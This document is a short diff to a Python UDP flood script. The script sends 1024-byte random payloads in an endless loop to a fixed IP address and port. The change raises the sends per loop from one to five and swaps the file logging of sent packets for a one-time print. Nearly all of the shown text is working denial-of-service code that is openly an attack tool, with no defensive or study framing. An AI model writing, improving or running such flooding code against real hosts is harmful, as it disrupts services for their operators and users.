@@ -12,11 +12,13 @@ from locale import str
 ip = "10.0.0.6"
 port = 80
 choice = "UDP"
-times = 1
+times = 5
 threads = 1
 
 
+
 def floodUDP():
+    j = True
     data = random._urandom(1024)
     i = random.choice(("[*]", "[!]", "[#]"))
     while True:
@@ -25,10 +27,13 @@ def floodUDP():
             address = (ip, port)
             for x in range(times):
                 s.sendto(data, address)
-            file_txt = open("attack_output.txt", 'a')
-            file_txt.writelines(i)
-            file_txt.writelines(" packets sent")
-            file_txt.writelines("\n")
+                if(j == True):
+                    print(i + " packets sent.")
+                    j = False
+            # file_txt = open("attack_output.txt", 'a')
+            # file_txt.writelines(i)
+            # file_txt.writelines(" packets sent")
+            # file_txt.writelines("\n")
         except:
             print("Error")
             break
